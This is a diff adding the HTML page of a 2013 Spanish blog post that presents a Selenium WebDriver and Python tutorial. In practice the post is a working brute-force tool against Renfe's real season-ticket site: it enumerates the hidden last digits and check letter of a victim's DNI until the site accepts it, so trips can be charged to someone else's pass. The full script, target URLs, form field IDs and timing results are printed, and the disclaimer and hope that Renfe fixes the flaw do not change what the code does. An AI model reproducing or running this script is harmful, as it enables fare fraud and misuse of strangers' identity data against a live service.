@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html prefix="
+og: http://ogp.me/ns#
+article: http://ogp.me/ns/article#
+" lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="Ejemplo real de uso de webdriver en python">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="max-age=43200">
+<meta http-equiv="ETag" content="b'9d3a2c636e1f062842af3aff686491e3efba2446'">
+<title>Webdriver: crackeando la web de Renfe | MagMax Blog</title>
+<link href="/assets/css/bootstrap.min.css" rel="stylesheet" type="text/css">
+<link href="/assets/css/rst.css" rel="stylesheet" type="text/css">
+<link href="/assets/css/code.css" rel="stylesheet" type="text/css">
+<link href="/assets/css/colorbox.css" rel="stylesheet" type="text/css">
+<link href="/assets/css/theme.css" rel="stylesheet" type="text/css">
+<link href="/assets/css/custom.css" rel="stylesheet" type="text/css">
+<link rel="alternate" type="application/rss+xml" title="RSS" href="http://feeds.feedburner.com/magmax">
+<link rel="canonical" href="http://magmax.org/blog/webdriver-practico/">
+<link rel="icon" href="/favicon.png" sizes="128x128">
+<link rel="icon" href="/favicon_330.png" sizes="330x330">
+<link rel="icon" href="/favicon.ico" sizes="16x16">
+<meta name="description" itemprop="description" content="Ejemplo real de uso de webdriver en python">
+<meta name="author" content="Miguel Ángel García">
+<link rel="prev" href="/blog/lamp-con-puppet/" title="LAMP con Puppet" type="text/html">
+<link rel="next" href="/blog/usando-git3/" title="Usando Git(3): Internals" type="text/html">
+<meta property="og:site_name" content="MagMax Blog">
+<meta property="og:title" content="Webdriver: crackeando la web de Renfe">
+<meta property="og:url" content="http://magmax.org/blog/webdriver-practico/">
+<meta property="og:description" content="Ejemplo real de uso de webdriver en python">
+<meta property="og:type" content="article">
+<meta property="article:author" content="Miguel Ángel García">
+<meta property="article:published_time" content="2013-11-16T00:00:00+00:00">
+<meta property="article:updated" content="2013-11-16T00:00:00">
+<meta property="article:tag" content="crack">
+<meta property="article:tag" content="python">
+<meta property="article:tag" content="selenium">
+<meta property="article:tag" content="webdriver">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:site" content="@magmax">
+<meta name="twitter:creator" content="@magmax">
+<meta name="twitter:title" content="MagMax Blog">
+<meta name="twitter:description" content="Ejemplo real de uso de webdriver en python">
+<meta name="twitter:url" content="http://magmax.org//blog/webdriver-practico/">
+<meta name="twitter:image" content="http://magmax.org/favicon.png">
+</head>
+<body>
+<a href="#content" class="sr-only sr-only-focusable">Ir al contenido principal</a>
+
+<!-- Menubar -->
+
+<nav class="navbar navbar-inverse navbar-fixed-top" role="navigation"><div class="container">
+<!-- This keeps the margins nice -->
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="http://magmax.org/">
+
+        <span id="blog-title">MagMax Blog</span>
+      </a>
+    </div>
+<!-- /.navbar-header -->
+    <div class="collapse navbar-collapse navbar-ex1-collapse">
+      <ul class="nav navbar-nav">
+<li>
+<a href="/">Inicio</a>
+                </li>
+<li>
+<a href="/archive.html">Archivo</a>
+                </li>
+<li>
+<a href="/categories">Categorías</a>
+                </li>
+<li>
+<a href="/projects">Proyectos</a>
+                </li>
+<li>
+<a href="/news">Posts Externos</a>
+
+        
+      </li>
+</ul>
+<ul class="nav navbar-nav navbar-right">
+<li>
+<form class="navbar-form navbar-left" role="search" action="http://google.com/search" method="get">
+<div class="form-group">
+<input type="hidden" name="sitesearch" value="magmax.org"><input type="text" name="q" class="form-control" placeholder="Search / Buscar">
+</div>
+</form>
+</li>
+
+        <li style="margin-left:0">
+          <a href="http://feeds.feedburner.com/magmax">
+            <img src="/assets/images/rss.png" style="width:22px;height:22px"></a>
+        </li>
+
+        
+      </ul>
+</div>
+<!-- /.navbar-collapse -->
+  </div>
+<!-- /.container -->
+</nav><!-- End of Menubar --><div class="container" id="content" role="main">
+  <div class="body-content">
+    <div class="row">
+      <div class="page-content col-md-9">
+        
+        <article class="post-text h-entry hentry postpage" itemscope="itemscope" itemtype="http://schema.org/Article"><header><h1 class="p-name entry-title" itemprop="headline name"><a href="/blog/webdriver-practico/" class="u-url">Webdriver: crackeando la web de Renfe</a></h1>
+            <div class="metadata text-muted">
+              <i class="glyphicon glyphicon-calendar"></i>
+              <p class="dateline">
+                <time class="published dt-published" datetime="2013-11-16T00:00:00+00:00" title="2013-11-16">2013-11-16</time>
+                // <time class="updated dt-updated" datetime="2013-11-16T00:00:00" title="2013-11-16">2013-11-16</time></p>
+              <p class="commentline">            <a href="/blog/webdriver-practico/#disqus_thread" data-disqus-identifier="cache/posts/webdriver-practico.html">Comments</a>
+
+</p>
+              <address class="vcard author"><a class="url fn" href="http://magmax.org">Miguel Ángel García</a></address>
+            </div>
+            <br></header><div class="e-content entry-content" itemprop="articleBody text">
+            <div>
+<p>Todos los días tengo que coger el tren para ir a trabajar. Hablando con un amigo que también tiene que ir en tren, se me ocurrió comentarle que la seguridad de los abonos es muy mala, ya que hay que formalizar cada viaje y sacar un billete, donde se muestra el número de abono y se ocultan los 3 últimos dígitos del DNI y la letra. Insistí en que era capaz de sacarme viajes con su abono si me daba uno de sus billetes...</p>
+<p>Y me retó.</p>
+<p>Y como creo que es un ejemplo estupendo de uso de <a href="http://www.seleniumhq.org/projects/webdriver/" title="Web oficial de WebDriver">WebDriver</a>. pues aquí lo tenemos.</p>
+<p>Además, podremos ver algunas de las características chulas de Python :D</p>
+<!-- TEASER_END -->
+
+<h2 id="licencia">Licencia</h2>
+<p>El código que aparece en esta página es puramente didáctico. No debe utilizarse en ningún caso para obtener beneficio alguno. No me hago responsable de su mal uso, dado que es necesario obtener un billete correspondiente a un abono. Es decir: No basta con emplear el código aquí expuesto sin más.</p>
+<p>Sinceramente espero que alguno de los programadores de la web de Renfe lea este artículo y lo utilice para dos cosas: Por un lado, para evitar este fallo de seguridad. Por otro, para implementar pruebas para la página que tienen.</p>
+<h2 id="el-problema">El problema</h2>
+<p>El problema podría enunciarse así: Dado el número de abono y las 5 primeras cifras del DNI, encontrar un DNI que permita formalizar viajes.</p>
+<p>Necesitaríamos el billete de algún ingenuo con abono... os sorprendería la cantidad de billetes que deja la gente en sus asientos.</p>
+<p>La solución va en Python, aunque también se puede hacer en Java u otro lenguaje.</p>
+<h3 id="primera-idea">Primera idea</h3>
+<p>Mi primera idea fue ver la solicitud y lanzar un montón de <code>curl</code>. Pero resulta que el DNI y el número de abono se cifran en cada llamada... Bueno, no es problema.</p>
+<p>Podría utilizar sus mismas funciones JavaScript sin cifrar de su página para codificar los argumentos... Pero hay otra manera más sencilla:</p>
+<h3 id="segunda-idea">Segunda idea</h3>
+<p>Siempre podemos recurrir a <a href="http://www.seleniumhq.org/projects/webdriver/" title="Web oficial de WebDriver">WebDriver</a>, e ir navegando la página hasta conseguir entrar.</p>
+<h3 id="generando-dnis">Generando DNIs</h3>
+<p>Aprovechando lo explicado en el <a href="/blog/python-avanzado">tutorial avanzado de Python</a>, no cuesta nada hacernos un generador de DNIs:</p>
+<pre class="code literal-block"><span class="k">class</span> <span class="nc">DniGenerator</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">prefix</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">_prefix</span> <span class="o">=</span> <span class="n">prefix</span>
+
+    <span class="k">def</span> <span class="nf">__iter__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">terminations</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
+        <span class="n">random</span><span class="o">.</span><span class="n">shuffle</span><span class="p">(</span><span class="n">terminations</span><span class="p">)</span>
+
+        <span class="k">return</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">__complete_dni</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="n">terminations</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">__complete_dni</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">suffix</span><span class="p">):</span>
+        <span class="n">number</span> <span class="o">=</span> <span class="s">'{prefix}{suffix:03}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">prefix</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">_prefix</span><span class="p">,</span> <span class="n">suffix</span><span class="o">=</span><span class="n">suffix</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">number</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">__letter_for_dni</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">number</span><span class="p">))</span>
+
+    <span class="k">def</span> <span class="nf">__letter_for_dni</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+        <span class="k">return</span> <span class="s">'TRWAGMYFPDXBNJZSQVHLCKE'</span><span class="p">[</span><span class="n">n</span><span class="o">%</span><span class="mi">23</span><span class="p">]</span>
+</pre>
+
+
+<p>Aquí podemos ver varias cosas interesantes. Mi clase implementa el método mágico <code>__iter__</code> que devuelve un iterador. En este caso, devuelvo un generador directamente, que irá recorriendo las terminaciones y generando un DNI completo para cada una.</p>
+<p>Respecto al crack, vemos que <a href="http://es.wikibooks.org/wiki/Algoritmo_para_obtener_la_letra_del_NIF#Python" title="Algoritmos para obtener la letra del DNI en distintos lenguajes">la letra del DNI se puede generar automáticamente</a>, por lo que el problema se reduce a la generación de los 1000 números secuenciales. Como todos los números tienen las mismas posibilidades, he decidido darle un poco de aletoriedad para tratar de jugar con ventaja.</p>
+<h3 id="argumentos-de-entrada">Argumentos de entrada</h3>
+<p>Veamos cómo leer los argumentos de entrada:</p>
+<pre class="code literal-block"><span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">usage</span><span class="o">=</span><span class="s">"Given the Abono data, retrieves the rest of the DNI"</span><span class="p">,</span>
+                                 <span class="n">description</span><span class="o">=</span><span class="s">"By MagMax&gt;"</span><span class="p">)</span>
+
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-dni'</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Initial DNI numbers"</span><span class="p">)</span>
+<span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-abono'</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">"store"</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Abono number"</span><span class="p">)</span>
+
+<span class="n">options</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+</pre>
+
+
+<p>Con eso es suficiente. Así no tengo que <em>hardcodear</em> mi DNI ni mi número de abono.</p>
+<h3 id="pageobjects">PageObjects</h3>
+<p>La mejor manera de usar <a href="http://www.seleniumhq.org/projects/webdriver/" title="Web oficial de WebDriver">WebDriver</a> es mediante <a href="/blog/selenium-y-qa-automation-3">PageObjects</a>. De esta manera, si modifican la página me será muy sencillo adaptar mi crack, y la implementación quedará oculta respecto del uso de la misma:</p>
+<pre class="code literal-block"><span class="k">class</span> <span class="nc">PageObject</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">browser</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">_browser</span> <span class="o">=</span> <span class="n">browser</span>
+
+
+<span class="k">class</span> <span class="nc">InitialPage</span><span class="p">(</span><span class="n">PageObject</span><span class="p">):</span>
+    <span class="nd">@staticmethod</span>
+    <span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">browser</span><span class="p">):</span>
+        <span class="n">browser</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://www.renfe.com/'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">InitialPage</span><span class="p">(</span><span class="n">browser</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">go_ticket_page</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">_browser</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://venta.renfe.com/vol/indiceAbonos.do?inirenfe=SI'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">TicketPage</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_browser</span><span class="p">)</span>
+
+
+<span class="k">class</span> <span class="nc">TicketPage</span><span class="p">(</span><span class="n">PageObject</span><span class="p">):</span>
+    <span class="n">TYPE_MONTHLY</span> <span class="o">=</span> <span class="s">'492'</span>
+    <span class="n">TYPE_WEEKLY</span> <span class="o">=</span> <span class="s">'490'</span>
+
+    <span class="k">def</span> <span class="nf">select_ticket_type</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ticket_type</span><span class="o">=</span><span class="n">TYPE_MONTHLY</span><span class="p">):</span>
+        <span class="n">select</span> <span class="o">=</span> <span class="n">Select</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_browser</span><span class="o">.</span><span class="n">find_element_by_id</span><span class="p">(</span><span class="s">'comboListaAbonos'</span><span class="p">))</span>
+        <span class="n">select</span><span class="o">.</span><span class="n">select_by_value</span><span class="p">(</span><span class="n">ticket_type</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">go_formalization_page</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">_browser</span><span class="o">.</span><span class="n">find_element_by_link_text</span><span class="p">(</span><span class="s">'Formalización de Viajes'</span><span class="p">)</span><span class="o">.</span><span class="n">click</span><span class="p">()</span>
+        <span class="k">return</span> <span class="n">FormalizationPage</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_browser</span><span class="p">)</span>
+
+
+<span class="k">class</span> <span class="nc">FormalizationPage</span><span class="p">(</span><span class="n">PageObject</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">write_code</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">code</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">_browser</span><span class="o">.</span><span class="n">find_element_by_id</span><span class="p">(</span><span class="s">'numAbonoBus'</span><span class="p">)</span><span class="o">.</span><span class="n">send_keys</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">write_dni</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">dni</span><span class="p">):</span>
+        <span class="n">box</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_browser</span><span class="o">.</span><span class="n">find_element_by_id</span><span class="p">(</span><span class="s">'dniCifBus'</span><span class="p">)</span>
+        <span class="n">box</span><span class="o">.</span><span class="n">send_keys</span><span class="p">(</span><span class="s">'</span><span class="se">\b</span><span class="s">'</span><span class="o">*</span><span class="mi">10</span><span class="p">)</span>
+        <span class="n">box</span><span class="o">.</span><span class="n">send_keys</span><span class="p">(</span><span class="n">dni</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">reload</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">_browser</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://venta.renfe.com/vol/formalizacionAbonos.do?cdgoAbonoElegido=492&amp;operAbonoElegido=AV'</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">is_valid</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">_browser</span><span class="o">.</span><span class="n">find_element_by_link_text</span><span class="p">(</span><span class="s">'Buscar'</span><span class="p">)</span><span class="o">.</span><span class="n">click</span><span class="p">()</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">WebDriverWait</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_browser</span><span class="p">,</span> <span class="mi">30</span><span class="p">)</span><span class="o">.</span><span class="n">until</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="o">.</span><span class="n">find_element_by_id</span><span class="p">(</span><span class="s">'link_botones_nav_href'</span><span class="p">)</span><span class="o">.</span><span class="n">is_displayed</span><span class="p">())</span>
+        <span class="k">except</span> <span class="n">TimeoutException</span><span class="p">:</span>
+            <span class="k">return</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">_browser</span><span class="o">.</span><span class="n">find_element_by_id</span><span class="p">(</span><span class="s">'link_botones_nav_href'</span><span class="p">)</span><span class="o">.</span><span class="n">is_displayed</span><span class="p">()</span>
+        <span class="k">return</span> <span class="bp">False</span>
+</pre>
+
+
+<p>Como veréis, sólo he modelado aquello que me hace falta: el botón de la página principal para ir a la página de tickets; la selección de tickets; el botón para ir a la página de formalizaciones; escribir el código del abono, escribir el DNI y pulsar el botón para entrar. Además tengo una comprobación de si he conseguido entrar o no (comprobando el mensaje de error).</p>
+<p>He tenido que hacer algún parchecillo, ya que el mensaje a veces se quedaba inaccesible, así que se recarga la página. Así consigo seguir aprovechándome de la sesión y seguir por donde iba (y evito posibles <em>leaks</em> de la página que me tirarían el navegador).</p>
+<p>Con eso puedo crearme el programa principal:</p>
+<pre class="code literal-block"><span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Chrome</span><span class="p">()</span>
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">initial_page</span> <span class="o">=</span> <span class="n">InitialPage</span><span class="o">.</span><span class="n">create</span><span class="p">(</span><span class="n">driver</span><span class="p">)</span>
+    <span class="n">ticket_page</span> <span class="o">=</span> <span class="n">initial_page</span><span class="o">.</span><span class="n">go_ticket_page</span><span class="p">()</span>
+    <span class="n">ticket_page</span><span class="o">.</span><span class="n">select_ticket_type</span><span class="p">()</span>
+    <span class="n">formalization_page</span> <span class="o">=</span> <span class="n">ticket_page</span><span class="o">.</span><span class="n">go_formalization_page</span><span class="p">()</span>
+    <span class="n">formalization_page</span><span class="o">.</span><span class="n">write_code</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">abono</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">dni</span> <span class="ow">in</span> <span class="n">DniGenerator</span><span class="p">(</span><span class="n">options</span><span class="o">.</span><span class="n">dni</span><span class="p">):</span>
+        <span class="k">print</span> <span class="s">'Testing DNI:'</span><span class="p">,</span> <span class="n">dni</span>
+        <span class="n">formalization_page</span><span class="o">.</span><span class="n">write_dni</span><span class="p">(</span><span class="n">dni</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">formalization_page</span><span class="o">.</span><span class="n">is_valid</span><span class="p">():</span>
+            <span class="k">print</span> <span class="s">'The required DNI is'</span><span class="p">,</span> <span class="n">dni</span>
+            <span class="k">break</span>
+<span class="k">finally</span><span class="p">:</span>
+    <span class="n">driver</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</pre>
+
+
+<p>Creo que es autoexplicativo...</p>
+<p>Este pequeño bucle comprueba aproximadamente 1 DNI cada 2 segundos... Eso significa que en 2000 segundos los habría probado todos. Reventar el abono de mi amigo en media hora no está nada mal, ¿verdad?</p>
+<h2 id="tiempos">Tiempos</h2>
+<p>Tardé un viaje en tener listo el programa (qué paradoja, ¿eh?). Tenía algunos bugs y tal que tuve que arreglar en casa, ya que la conexión del móvil me ralentizó bastante.</p>
+<p>Realmente me basé en un programa que ya tenía y que me permitía sacar billetes rápidamente, cuando la web de Renfe no mostraba la selección de asientos. Esto ya lo han arreglado y mi script no es tan útil.</p>
+<p>Mi máquina de viaje es un <strong>Intel Atom N450</strong> con <strong>1Gb de RAM</strong>, y es donde he lanzado las pruebas:</p>
+<ul>
+<li>Una ejecución encontró el resultado en el <strong>intento 128</strong>, tardando <strong>5'46''</strong>.</li>
+<li>Otra, en el <strong>intento 914</strong>, tardó <strong>37'18''</strong>
+</li>
+<li>La tercera, <strong>intento 332</strong> y <strong>13'56''</strong>
+</li>
+</ul>
+<h2 id="mas-informacion">Más información</h2>
+<p>Podéis encontrar más información sobre los <a href="/blog/selenium-y-qa-automation-3">PageObjects</a> en el artículo que escribí al respecto.</p>
+<p>Tenéis más información sobre Python en mi <a href="/blog/python-avanzado">tutorial avanzado de Python</a>.</p>
+<h2 id="todo-el-codigo">Todo el código</h2>
+<pre class="code literal-block"><span class="c">#!/usr/bin/env python</span>
+<span class="c"># -*- coding:utf-8; tab-width:4; mode:python -*-</span>
+
+<span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">import</span> <span class="nn">random</span>
+
+<span class="kn">from</span> <span class="nn">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>
+<span class="kn">from</span> <span class="nn">selenium.common.exceptions</span> <span class="kn">import</span> <span class="n">NoSuchElementException</span><span class="p">,</span> <span class="n">TimeoutException</span>
+<span class="kn">from</span> <span class="nn">selenium.webdriver.support.ui</span> <span class="kn">import</span> <span class="n">Select</span>
+<span class="kn">from</span> <span class="nn">selenium.webdriver.support.wait</span> <span class="kn">import</span> <span class="n">WebDriverWait</span>
+
+
+<span class="k">class</span> <span class="nc">PageObject</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">browser</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">_browser</span> <span class="o">=</span> <span class="n">browser</span>
+
+
+<span class="k">class</span> <span class="nc">InitialPage</span><span class="p">(</span><span class="n">PageObject</span><span class="p">):</span>
+    <span class="nd">@staticmethod</span>
+    <span class="k">def</span> <span class="nf">create</span><span class="p">(</span><span class="n">browser</span><span class="p">):</span>
+        <span class="n">browser</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'http://www.renfe.com/'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">InitialPage</span><span class="p">(</span><span class="n">browser</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">go_ticket_page</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">_browser</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://venta.renfe.com/vol/indiceAbonos.do?inirenfe=SI'</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">TicketPage</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_browser</span><span class="p">)</span>
+
+
+<span class="k">class</span> <span class="nc">TicketPage</span><span class="p">(</span><span class="n">PageObject</span><span class="p">):</span>
+    <span class="n">TYPE_MONTHLY</span> <span class="o">=</span> <span class="s">'492'</span>
+    <span class="n">TYPE_WEEKLY</span> <span class="o">=</span> <span class="s">'490'</span>
+
+    <span class="k">def</span> <span class="nf">select_ticket_type</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ticket_type</span><span class="o">=</span><span class="n">TYPE_MONTHLY</span><span class="p">):</span>
+        <span class="n">select</span> <span class="o">=</span> <span class="n">Select</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_browser</span><span class="o">.</span><span class="n">find_element_by_id</span><span class="p">(</span><span class="s">'comboListaAbonos'</span><span class="p">))</span>
+        <span class="n">select</span><span class="o">.</span><span class="n">select_by_value</span><span class="p">(</span><span class="n">ticket_type</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">go_formalization_page</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">_browser</span><span class="o">.</span><span class="n">find_element_by_link_text</span><span class="p">(</span><span class="s">'Formalización de Viajes'</span><span class="p">)</span><span class="o">.</span><span class="n">click</span><span class="p">()</span>
+        <span class="k">return</span> <span class="n">FormalizationPage</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_browser</span><span class="p">)</span>
+
+
+<span class="k">class</span> <span class="nc">FormalizationPage</span><span class="p">(</span><span class="n">PageObject</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">write_code</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">code</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">_browser</span><span class="o">.</span><span class="n">find_element_by_id</span><span class="p">(</span><span class="s">'numAbonoBus'</span><span class="p">)</span><span class="o">.</span><span class="n">send_keys</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">write_dni</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">dni</span><span class="p">):</span>
+        <span class="n">box</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_browser</span><span class="o">.</span><span class="n">find_element_by_id</span><span class="p">(</span><span class="s">'dniCifBus'</span><span class="p">)</span>
+        <span class="n">box</span><span class="o">.</span><span class="n">send_keys</span><span class="p">(</span><span class="s">'</span><span class="se">\b</span><span class="s">'</span><span class="o">*</span><span class="mi">10</span><span class="p">)</span>
+        <span class="n">box</span><span class="o">.</span><span class="n">send_keys</span><span class="p">(</span><span class="n">dni</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">reload</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">_browser</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">'https://venta.renfe.com/vol/formalizacionAbonos.do?cdgoAbonoElegido=492&amp;operAbonoElegido=AV'</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">is_valid</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">_browser</span><span class="o">.</span><span class="n">find_element_by_link_text</span><span class="p">(</span><span class="s">'Buscar'</span><span class="p">)</span><span class="o">.</span><span class="n">click</span><span class="p">()</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">WebDriverWait</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_browser</span><span class="p">,</span> <span class="mi">30</span><span class="p">)</span><span class="o">.</span><span class="n">until</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="o">.</span><span class="n">find_element_by_id</span><span class="p">(</span><span class="s">'link_botones_nav_href'</span><span class="p">)</span><span class="o">.</span><span class="n">is_displayed</span><span class="p">())</span>
+        <span class="k">except</span> <span class="n">TimeoutException</span><span class="p">:</span>
+            <span class="k">return</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">_browser</span><span class="o">.</span><span class="n">find_element_by_id</span><span class="p">(</span><span class="s">'link_botones_nav_href'</span><span class="p">)</span><span class="o">.</span><span class="n">is_displayed</span><span class="p">()</span>
+        <span class="k">return</span> <span class="bp">False</span>
+
+
+
+<span class="k">class</span> <span class="nc">DniGenerator</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">prefix</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">_prefix</span> <span class="o">=</span> <span class="n">prefix</span>
+
+    <span class="k">def</span> <span class="nf">__iter__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">terminations</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
+        <span class="n">random</span><span class="o">.</span><span class="n">shuffle</span><span class="p">(</span><span class="n">terminations</span><span class="p">)</span>
+
+        <span class="k">return</span> <span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">__complete_dni</span><span class="p">(</span><span class="n">n</span><span class="p">)</span> <span class="k">for</span> <span class="n">n</span> <span class="ow">in</span> <span class="n">terminations</span><span class="p">)</span>
+
+    <span class="k">def</span> <span class="nf">__letter_for_dni</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
+        <span class="k">return</span> <span class="s">'TRWAGMYFPDXBNJZSQVHLCKE'</span><span class="p">[</span><span class="n">n</span><span class="o">%</span><span class="mi">23</span><span class="p">]</span>
+
+    <span class="k">def</span> <span class="nf">__complete_dni</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">suffix</span><span class="p">):</span>
+        <span class="n">number</span> <span class="o">=</span> <span class="s">'{prefix}{suffix:03}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">prefix</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">_prefix</span><span class="p">,</span> <span class="n">suffix</span><span class="o">=</span><span class="n">suffix</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">number</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">__letter_for_dni</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">number</span><span class="p">))</span>
+
+
